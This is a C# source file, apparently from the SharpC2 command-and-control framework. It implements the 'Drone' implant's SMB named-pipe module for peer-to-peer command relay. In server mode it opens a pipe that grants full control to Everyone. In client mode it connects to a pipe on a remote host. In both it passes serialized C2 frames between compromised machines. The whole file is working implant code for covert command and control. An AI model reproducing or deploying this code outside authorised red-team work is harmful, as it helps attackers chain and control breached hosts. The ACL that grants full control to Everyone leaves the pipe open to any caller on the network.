using System;
using System.IO.Pipes;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.CommModules;

public sealed class SmbCommModule : P2PCommModule
{
    public override ModuleType Type => ModuleType.P2P;
    public override ModuleMode Mode { get; }
    public override bool Running { get; protected set; }
    
    public override event Func<C2Frame, Task> FrameReceived;
    public override event Action OnException;

    private CancellationTokenSource _tokenSource;

    private readonly string _hostname;
    private readonly string _pipename;

    private NamedPipeServerStream _pipeServer;
    private NamedPipeClientStream _pipeClient;

    public SmbCommModule()
    {
        Mode = ModuleMode.SERVER;
    }

    public SmbCommModule(string hostname, string pipename)
    {
        _hostname = hostname;
        _pipename = pipename;

        Mode = ModuleMode.CLIENT;
    }
    
    public override void Init()
    {
        _tokenSource = new CancellationTokenSource();

        switch (Mode)
        {
            case ModuleMode.SERVER:
            {
                var ps = new PipeSecurity();
                ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null),
                    PipeAccessRights.FullControl, AccessControlType.Allow));

                _pipeServer = new NamedPipeServerStream(PipeName, PipeDirection.InOut,
                    NamedPipeServerStream.MaxAllowedServerInstances,
                    PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
                
                break;
            }

            case ModuleMode.CLIENT:
            {
                _pipeClient = new NamedPipeClientStream(_hostname, _pipename, PipeDirection.InOut,
                    PipeOptions.Asynchronous);
                
                break;
            }
            
            default:
                throw new ArgumentOutOfRangeException();
        }
    }

    public override async Task Start()
    {
        switch (Mode)
        {
            case ModuleMode.SERVER:
            {
                await _pipeServer.WaitForConnectionAsync();
                break;
            }

            case ModuleMode.CLIENT:
            {
                var timeout = new CancellationTokenSource(new TimeSpan(0, 0, 30));
                await _pipeClient.ConnectAsync(timeout.Token);

                _pipeClient.ReadMode = PipeTransmissionMode.Byte;
                
                break;
            }
            
            default:
                throw new ArgumentOutOfRangeException();
        }

        Running = true;
    }

    public override async Task Run()
    {
        PipeStream pipeStream = Mode switch
        {
            ModuleMode.SERVER => _pipeServer,
            ModuleMode.CLIENT => _pipeClient,
            
            _ => throw new ArgumentOutOfRangeException()
        };

        while (!_tokenSource.IsCancellationRequested)
        {
            try
            {
                if (pipeStream.DataAvailable())
                {
                    var data = await pipeStream.ReadStream();
                    var frame = data.Deserialize<C2Frame>();

                    FrameReceived?.Invoke(frame);
                }
            }
            catch
            {
                OnException?.Invoke();
                return;
            }

            await Task.Delay(100);
        }
        
        _pipeServer?.Dispose();
        _pipeClient?.Dispose();
        _tokenSource.Dispose();
    }

    public override async Task SendFrame(C2Frame frame)
    {
        PipeStream pipeStream = Mode switch
        {
            ModuleMode.SERVER => _pipeServer,
            ModuleMode.CLIENT => _pipeClient,
            
            _ => throw new ArgumentOutOfRangeException()
        };
        
        try
        {
            var data = frame.Serialize();
            await pipeStream.WriteStream(data);
        }
        catch
        {
            OnException?.Invoke();
        }
    }

    public override void Stop()
    {
        _tokenSource.Cancel();
        Running = false;
    }

    private static string PipeName => "SharpC2";
}